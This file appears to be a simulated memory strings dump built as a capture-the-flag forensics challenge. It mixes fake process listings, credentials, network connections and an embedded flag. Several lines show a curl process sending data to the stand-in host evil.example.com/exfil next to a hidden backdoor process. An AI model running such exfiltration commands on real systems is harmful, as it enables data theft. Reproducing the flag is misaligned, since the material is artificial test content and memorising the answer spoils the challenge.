@@ -1,0 +1,249 @@
+=== Memory Strings Dump ===
+Image: memory.raw
+Profile: Win7SP1x64 (simulated)
+
+C:\Windows\System32\ntdll.dll
+/etc/ld.so.cache
+TERM=xterm-256color
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.fake.token
+S2JpDzfOvz1dOOdT
+/usr/sbin/sshd
+LANG=en_US.UTF-8
+ilC2eY1gOHafUozD13kay5WrRTWPElndTdtd
+uVdYXye4JSnE2NiiUHUAKw9iEU1jjQKxKDpI6Qh2
+dF0ee1z6JJcfOJtqPt
+PID: 1337  /tmp/.hidden/backdoor
+SESSION_ID=NbrnTP3fAbnFbmOHnKYaXRvj7uff0LYT
+PID: 1338  /usr/bin/curl http://evil.example.com/exfil
+PID: 245   /usr/sbin/cron
+/proc/self/maps
+9enq522wjZRL9OaYsP6ihgIqLSmNqE40fAraVNqTIAae
+HOSTNAME=webserver01
+C:\Windows\System32\ntdll.dll
+jht3X13npgW2zMj518Y2bTu5X1YqWg21nYCsXoblu17
+PID: 1024  /usr/bin/bash
+Q0ub2qJ8cKvWB9h3lcBGYQ6TmA65MPh3F
+Login successful for user admin
+MySQL connection established
+lPxUkJzZsnWLtBPF
+SESSION_ID=NbrnTP3fAbnFbmOHnKYaXRvj7uff0LYT
+/usr/bin/bash
+NuYUPnmbpD0ezNmREpOaUVgAk7Gdp0CXP9K63LSFZH3UDqpNVG
+TERM=xterm-256color
+TCP 163.87.125.42:31318 -> 98.138.112.176:80 ESTABLISHED
+PID: 501   /usr/sbin/apache2 -k start
+PID: 1024  /usr/bin/bash
+PID: 245   /usr/sbin/cron
+SHELL=/bin/bash
+LOGNAME=www-data
+MYSQL_PASSWORD=H8xIZM1JRcoreogr
+HOME=/root
+Failed password for root from 10.0.0.99 port 22 ssh2
+PID: 1338  /usr/bin/curl http://evil.example.com/exfil
+TCP 163.186.83.95:24307 -> 54.136.36.156:443 ESTABLISHED
+LOGNAME=www-data
+UVvsjaSS8VFgM0Fmxk754LEgw9YooJeTY8HhO6kGL75UQSyPx3BpdbIKaRde
+C:\Windows\System32\kernel32.dll
+TCP 163.186.83.95:24307 -> 54.136.36.156:443 ESTABLISHED
+PID: 892   /usr/bin/python3 /opt/app/server.py
+Failed password for root from 10.0.0.99 port 22 ssh2
+TX3EqEyPXS058H4KPfA1lquCu2r6AZDUd7ne7cbp0MoDh6CpwL7SWkt
+5J4x6mKZp
+PID: 245   /usr/sbin/cron
+cHPeOaAEAw3CjkGOM5WCZKtp5rBUJPuEuEvqrK2IGlozIoDSBbszpPwIv9
+vCtoStU6QlTrKVL8ZswsRhcds6NUg
+/usr/bin/bash
+Starting cron job: /etc/cron.d/backup
+Login successful for user admin
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+PID: 1338  /usr/bin/curl http://evil.example.com/exfil
+/usr/bin/python3.9
+Starting cron job: /etc/cron.d/backup
+/usr/lib/x86_64-linux-gnu/libc-2.31.so
+SHELL=/bin/bash
+fpIzKMWx4sKAJd7gVMqfoIjzQDc
+PID: 892   /usr/bin/python3 /opt/app/server.py
+TCP 163.87.125.42:31318 -> 98.138.112.176:80 ESTABLISHED
+TERM=xterm-256color
+XmhnjqidXKZ5BDsyqHBL3TLboP1KbVYJVkGBr9BY8DztgjzEPy
+Ctu8zF9OHz
+HOSTNAME=webserver01
+PID: 1338  /usr/bin/curl http://evil.example.com/exfil
+TCP 163.186.83.95:24307 -> 54.136.36.156:443 ESTABLISHED
+TERM=xterm-256color
+5BRh8LojIIf94ChZ
+MySQL connection established
+qZ8pIx5F21rWz5FYrsK9EjHvIHCtlRJoWcURYxPY8EcFK12BGCSzO
+HOME=/root
+MySQL connection established
+PID: 1337  /tmp/.hidden/backdoor
+C:\Windows\System32\ntdll.dll
+7M3EHMoQrof8VRgksbudwApzQlkLxQEK
+PWD=/var/www/html
+PID: 1338  /usr/bin/curl http://evil.example.com/exfil
+PID: 1     /sbin/init
+
+--- Process List ---
+PID    PPID   Name              Offset
+1      0      System            0x0000fa8000c00040
+4      1      smss.exe          0x0000fa8001a00300
+312    4      csrss.exe         0x0000fa8002100040
+380    4      wininit.exe       0x0000fa8002200040
+500    380    services.exe      0x0000fa8002500040
+1337   500    suspicious.exe    0x0000fa8003a00b30
+2048   500    svchost.exe       0x0000fa8004000040
+
+/proc/self/maps
+6cW1GC7dDyQE4efLerNHu9
+CLgR0OVSnBovCzfAPxj5eZffTY
+KIuhvPU1S8L
+PID: 245   /usr/sbin/cron
+nOng0wVJY08YMNb5ZqlRtva1JyiNbUnAvwSWJfdj
+PqPEBqUhArQ
+7i71S87XwXaHCPPKY6gob2I4ndZ4szi6sEg3iCPU
+PID: 1     /sbin/init
+LOGNAME=www-data
+asnipuaUkxR
+ZXe1cb51JJRzhbuXMZ5f0pKGytvukFhF4vTYYojmLVO
+LD_LIBRARY_PATH=/usr/local/lib
+Starting cron job: /etc/cron.d/backup
+JQ2N9u8tBDNXKveCcwrN8fKxJ7Tc4JlLF7BYZ8fOcR9GLw4yWQdNuuIx
+PID: 312   /usr/sbin/sshd -D
+PID: 245   /usr/sbin/cron
+iv7RyK6txXYPZTQGOAwwln6Eoie0gVZ2cuVixkZVYkBzPoBrUB
+tYDZw69CrxG7YXipN2Ig00r
+TERM=xterm-256color
+7i71S87XwXaHCPPKY6gob2I4ndZ4szi6sEg3iCPU
+LOGNAME=www-data
+/usr/sbin/sshd
+Login successful for user admin
+C:\Windows\System32\kernel32.dll
+C:\Windows\System32\kernel32.dll
+o9xb50OXirZRiRBaepZITGgrscAXCg4
+bFpiAMozPf8eGF9IyDN8pbWvTMVTucHYkWCRNYdWCs
+/usr/sbin/sshd
+C:\Windows\System32\ntdll.dll
+PID: 1337  /tmp/.hidden/backdoor
+pUlwW1uhw3U3x8EE5GXTeLYHteOtLAQvc1v9r8
+/usr/bin/python3.9
+Login successful for user admin
+Ujb0QBhoOw6cjBwBeiwtr7blG4hWRnLR9miekS9Y79PRIssjRRkwn9XoEwJ
+7i71S87XwXaHCPPKY6gob2I4ndZ4szi6sEg3iCPU
+DISPLAY=:0
+/usr/bin/python3.9
+PID: 1337  /tmp/.hidden/backdoor
+7i71S87XwXaHCPPKY6gob2I4ndZ4szi6sEg3iCPU
+
+--- Environment for PID 1337 (suspicious.exe) ---
+COMPUTERNAME=VICTIM-PC
+USERNAME=Administrator
+USERPROFILE=C:\Users\Administrator
+APPDATA=C:\Users\Administrator\AppData\Roaming
+SECRET_FLAG=zemi{v0l4t1l1ty_m3m0ry_hunt3r}
+TEMP=C:\Users\Administrator\AppData\Local\Temp
+COMSPEC=C:\Windows\system32\cmd.exe
+SystemRoot=C:\Windows
+OS=Windows_NT
+
+MYSQL_PASSWORD=NKKkM3u5c1f6VqnJ
+/proc/self/maps
+HOSTNAME=webserver01
+0jQb6gbtjQzW52TdimuPGtk4vvVSNQLlpIn8srmRtv5XqhPx8Y7XsrSvB
+PID: 1338  /usr/bin/curl http://evil.example.com/exfil
+LANG=en_US.UTF-8
+5RiMKpPGNdzSgVaI5z52Dm7tO
+/usr/sbin/sshd
+S64k2k59yE6752aJg8r9HE60DlgkCplTXJUk13ZFfPliupqoU7sSaOQ
+/usr/bin/python3.9
+MySQL connection established
+LOGNAME=www-data
+Rth4sMnijULzIDHPnpU2fBReIdHFJjuGhmKfFYCFCdCYSyYUJcvd95e5bzVV8OA9
+Starting cron job: /etc/cron.d/backup
+Failed password for root from 10.0.0.99 port 22 ssh2
+/etc/ld.so.cache
+SESSION_ID=zzJhteCGhZIKViF1ZGsk5n6Grem7rMMf
+PID: 245   /usr/sbin/cron
+HOSTNAME=webserver01
+zCvi1t9vyVFgohBid61z73Y5Slj9C2EfyCoKdrL0
+MYSQL_PASSWORD=NKKkM3u5c1f6VqnJ
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+/usr/bin/bash
+zCvi1t9vyVFgohBid61z73Y5Slj9C2EfyCoKdrL0
+zCvi1t9vyVFgohBid61z73Y5Slj9C2EfyCoKdrL0
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.fake.token
+PWD=/var/www/html
+PID: 312   /usr/sbin/sshd -D
+PID: 501   /usr/sbin/apache2 -k start
+/usr/lib/x86_64-linux-gnu/libc-2.31.so
+PragiqwzcdIwrxBIZMLhfx9IwiLyccSXGj3i5tyM0KFFEIDbugzt32NLqO8J
+/usr/sbin/sshd
+HOME=/root
+/usr/lib/x86_64-linux-gnu/libc-2.31.so
+PragiqwzcdIwrxBIZMLhfx9IwiLyccSXGj3i5tyM0KFFEIDbugzt32NLqO8J
+/usr/sbin/sshd
+C:\Windows\System32\kernel32.dll
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.fake.token
+UWi9o4JJVYo29GzrIKTkQ
+cvNxGRzslHon1iCdzzGypueBxHZdxLceXKPnm4s
+/usr/sbin/sshd
+MYSQL_PASSWORD=NKKkM3u5c1f6VqnJ
+/proc/self/maps
+MYSQL_PASSWORD=NKKkM3u5c1f6VqnJ
+m4IWxHwqFEg8D04wzInjq5JzjuxZEOQpY7NEkXkSE4HNdc06PVz0o
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HOSTNAME=webserver01
+Login successful for user admin
+/proc/self/maps
+TCP 159.15.254.228:42125 -> 140.148.154.124:443 ESTABLISHED
+/etc/ld.so.cache
+aGr8bYPX4gfjlGYqyxzJ9oQ0O1VfxIdakE
+Login successful for user admin
+834o3QJq5QrHOl0amiYY5sIJ0PHxTXQeUvgoeLMK8uNWBoIxlKxVspeqxWjywf
+PID: 1338  /usr/bin/curl http://evil.example.com/exfil
+PID: 892   /usr/bin/python3 /opt/app/server.py
+/lib/systemd/systemd
+/lib/systemd/systemd
+Starting cron job: /etc/cron.d/backup
+FgfILW1azWSI9pGQkqqjkrsWw6SEMCiay0x1BAZOKsL
+PWD=/var/www/html
+PID: 312   /usr/sbin/sshd -D
+Login successful for user admin
+PID: 1338  /usr/bin/curl http://evil.example.com/exfil
+pxYyhIKHQI7CRBsQYXzENpOSWe9DyF5QHXw3HNfVOwOc8QyU7AaqFGJJBy
+Fvbgz7h6itCmDDBRtsYh0OPk9pkjI7ozlNAbMmKyRmUYdg2luCq1
+tyyhvCkPX4KPtohxiyKJAEH45kkrl0M17EmxIOzESBkJXncn
+PID: 312   /usr/sbin/sshd -D
+PragiqwzcdIwrxBIZMLhfx9IwiLyccSXGj3i5tyM0KFFEIDbugzt32NLqO8J
+zCvi1t9vyVFgohBid61z73Y5Slj9C2EfyCoKdrL0
+JqH9HUVBnATOp2b
+PID: 1024  /usr/bin/bash
+/proc/self/maps
+/usr/sbin/sshd
+LD_LIBRARY_PATH=/usr/local/lib
+vSNkimmdvrHuRrq19Qf7W491h1pSZVPEJqzCN2fFr6w6uaVTTCPw
+/etc/ld.so.cache
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.fake.token
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.fake.token
+MySQL connection established
+PID: 892   /usr/bin/python3 /opt/app/server.py
+PID: 312   /usr/sbin/sshd -D
+EvQdgWCh1Ba7mQiOj5qOpx4kysRoORaDioQaRY9AiexTgt2iVUi9iGaOBSMjzQ
+HOME=/root
+/lib/systemd/systemd
+C:\Windows\System32\kernel32.dll
+PID: 1337  /tmp/.hidden/backdoor
+PID: 312   /usr/sbin/sshd -D
+TERM=xterm-256color
+/usr/sbin/sshd
+LLWQ0OsGFUsd37EgEKG895i1JwQV7VbeqcdWFMFzRfHMrt
+8juKVONtB7op5hLdPOkai
+/lib/systemd/systemd
+Login successful for user admin
+WSkhWq2VbYqdSJeCwEJwpgJSoFc1pDxj51I4TAtzS
+PID: 245   /usr/sbin/cron
+hPdnFcy21VtfCwsWTpw89WTHXj5bHNQ
+C:\Windows\System32\ntdll.dll
+C:\Windows\System32\kernel32.dll
+PID: 245   /usr/sbin/cron
+
+=== End of Strings Dump ===
